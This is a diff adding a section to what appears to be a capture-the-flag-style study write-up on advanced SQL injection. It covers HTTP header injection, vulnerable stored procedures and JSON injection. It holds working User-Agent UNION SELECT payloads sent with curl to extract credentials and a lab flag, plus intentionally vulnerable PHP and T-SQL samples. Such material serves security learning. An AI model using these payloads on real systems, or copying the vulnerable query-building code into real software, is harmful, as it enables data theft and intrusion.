@@ -696,8 +696,112 @@ Then see the contents by `cat /tmp/basedir.txt`
 
 **Note**: Start the python SMB Server again, if you donot see the `basedir.txt`
 
+## Other Techniques
 
+Advanced SQL injection involves a range of sophisticated methods that go beyond basic attacks. Here are a few important advanced techniques that pentesters should be aware of:
 
+### HTTP Header Injection
+
+HTTP headers can carry user input, which might be used in SQL queries on the server side. user-agent injectionIf these inputs are not sanitised, it can lead to SQL injection. The technique involves manipulating HTTP headers (like `User-Agent`, `Referer`, or `X-Forwarded-For`) to inject SQL commands. The server might log these headers or use them in SQL queries. 
+
+For example, a malicious `User-Agent` header would look like `User-Agent: ' OR 1=1; --`. If the server includes the User-Agent header in an SQL query without sanitising it, it can result in SQL injection.
+
+In this example, a web application logs the User-Agent header from HTTP requests into a table named logs in the database. The application provides an endpoint at `http://10.49.130.247/httpagent/` that displays all the logged entries from the logs table. When users visit a webpage, their browser sends a User-Agent header, which identifies the browser and operating system. This header is typically used for logging purposes or to tailor content for specific browsers. In our application, this User-Agent header is inserted into the logs table and can then be viewed through the provided endpoint.
+
+<img width="518" height="154" alt="image" src="https://github.com/user-attachments/assets/4013bbc2-ae0f-4ac2-bdf0-9f129d0c8eb7" />
+
+Given the endpoint, an attacker might attempt to inject SQL code into the User-Agent header to exploit SQL injection vulnerabilities. For instance, by setting the User-Agent header to a malicious value such as User-Agent: `' UNION SELECT username, password FROM user; --`, an attacker attempts to inject SQL code that combines the results from the logs table with sensitive data from the user table.
+
+Here is the server-side code that inserts the logs.
+
+```
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$insert_sql = "INSERT INTO logs (user_Agent) VALUES ('$userAgent')";
+if ($conn->query($insert_sql) === TRUE) {
+    echo "<p class='text-green-500'>New logs inserted successfully</p>";
+} else {
+    echo "<p class='text-red-500'>Error: " . $conn->error . " (Error Code: " . $conn->errno . ")</p>";
+}
+
+$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'";
+```
+
+The User-Agent value is inserted into the logs table using an `INSERT` SQL statement. If the insertion is successful, a success message is displayed. An error message with details is shown if there is an error during insertion.
+
+**Preparing the Payload**
+
+We will prepare and inject an SQL payload into the `User-Agent` header to demonstrate how SQL injection can be exploited through HTTP headers. Our target payload will be `' UNION SELECT username, password FROM user; #`. This payload is designed to:
+- Close the Existing String Literal: The initial single quote (`'`) is used to close the existing string literal in the SQL query.
+- Inject a UNION SELECT Statement: The `UNION SELECT username, password FROM user;` part of the payload is used to retrieve the username and password columns from the user table.
+- Comment Out the Rest of the Query: The `#` character is used to comment out the remainder of the SQL query, ensuring that any subsequent SQL code is ignored.
+
+We need to send this payload as part of the User-Agent header in our HTTP request to inject this payload, which could be done using tools like Burp Suite or cURL. We will use the `curl` command-line tool to send an HTTP request with a custom `User-Agent` header. 
+
+Command: `curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://MACHINE_IP/httpagent/`
+
+<img width="854" height="225" alt="image" src="https://github.com/user-attachments/assets/05c97b0e-96ce-43e7-ae47-b6a27cac52cf" />
+
+The server's response will be displayed in the terminal. If the SQL injection is successful, you will see the extracted data (usernames and passwords) in the response.
+
+---
+
+### Exploiting Stored Procedures
+
+Stored procedures are routines stored in the database that can perform various operations, such as inserting, updating, or querying data. While stored procedures can help improve performance and ensure consistency, they can also be vulnerable to SQL injection if not properly handled.
+
+A stored procedure is a pre-written set of SQL commands saved inside the database. You can call it whenever you need it instead of writing the same SQL commands again.
+
+Stored procedures are precompiled SQL statements that can be executed as a single unit. They are stored in the database and can be called by applications to perform specific tasks. Stored procedures can accept parameters, which can make them flexible and powerful. However, if these parameters are not properly sanitised, they can introduce SQL injection vulnerabilities.
+
+Consider a stored procedure designed to retrieve user data based on a username:
+
+```
+CREATE PROCEDURE sp_getUserData
+    @username NVARCHAR(50)
+AS
+BEGIN
+    DECLARE @sql NVARCHAR(4000)
+    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
+    EXEC(@sql)
+END
+```
+
+In this example, the stored procedure concatenates the `@username` parameter into a dynamic SQL query. This approach is vulnerable to SQL injection because the input is not sanitised.
+
+---
+
+### XML and JSON Injection 
+
+Applications that parse XML or JSON data and use the parsed data in SQL queries can be vulnerable to injection if they do not properly sanitise the inputs. XML and JSON injection involves injecting malicious data into XML or JSON structures that are then used in SQL queries. This can occur if the application directly uses parsed values in SQL statements.
+
+```
+{
+  "username": "admin' OR '1'='1--",
+  "password": "password"
+}
+```
+
+If the application uses these values directly in a SQL query like `SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- AND password = 'password'`, it could result in an injection.
+
+---
+
+### Answer th questions below
+
+1. What is the value of the flag field in the books table where book_id =1?
+
+We dont know the columns of the books table so first finding out the columns: `curl -H "User-Agent: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='books' # " http://MACHINE_IP/httpagent/`
+
+<img width="856" height="260" alt="image" src="https://github.com/user-attachments/assets/d66957c0-1200-4087-a657-69414cf702a8" />
+
+This gives us 5 columns: `book_id`, `ssn`, `book_name`, `author` and `flag`
+
+Now we know the columns then getting the flag: `curl -H "User-Agent: ' UNION SELECT book_id, flag  FROM books WHERE book_id = 1; # " http://MACHINE_IP/httpagent/`
+
+<img width="1723" height="430" alt="image" src="https://github.com/user-attachments/assets/d13d549f-4656-4eb3-86c4-dcd952e8b2f4" />
+
+2. What field is detected on the server side when extracting the user agent from an HTTP request?
+
+User-Agent
 
 
 
